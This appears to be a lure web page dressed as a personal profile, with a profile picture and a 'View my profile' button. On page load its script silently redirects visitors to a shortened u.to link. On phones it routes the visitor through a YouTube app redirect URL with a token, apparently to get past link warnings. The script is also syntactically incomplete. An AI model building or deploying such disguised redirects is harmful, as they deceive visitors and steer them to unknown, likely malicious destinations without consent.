<body>
  <img src="https://drive.google.com/uc?id=1x5-GP4kp6lW0F97IkNLS8ZDlQiWecw8D" alt="Profile Picture">
  <button onclick="myFunction()">View my profile</button>
<script>
    setTimeout(function() {
      myFunction();

    function myFunction() {
      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbTFITFJ0aFJpWG51VVNUYkhRcHU3Yzgyc1djd3xBQ3Jtc0tudkJxMUhKZHJnaVNLdW5YT1pnWHdOdE9YQ0o5YmVMWndUSW1HZWdsMExibXEzZ1VRSHNQRFlQeWdpUEhzQnpWUGZkS0tremp6UTg2NmpKNVlXX0p2QzV6TER5NGM2NXdRMHNrbmgwUjk1OGl4S2FxUQ&q=https%3A%2F%2Fu.to%2FfufcHg&html_redirect=1";
      
      var fallback = "https://u.to/fufcHg";

      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
          window.location = app;
          window.setTimeout(function() {
              window.location = fallback;
          }, 25);
      } else {
          window.location = fallback;
      }

      function killPopup() {
          window.removeEventListener('pagehide', killPopup);
      }

      window.addEventListener('pagehide', killPopup);
    }
</script>
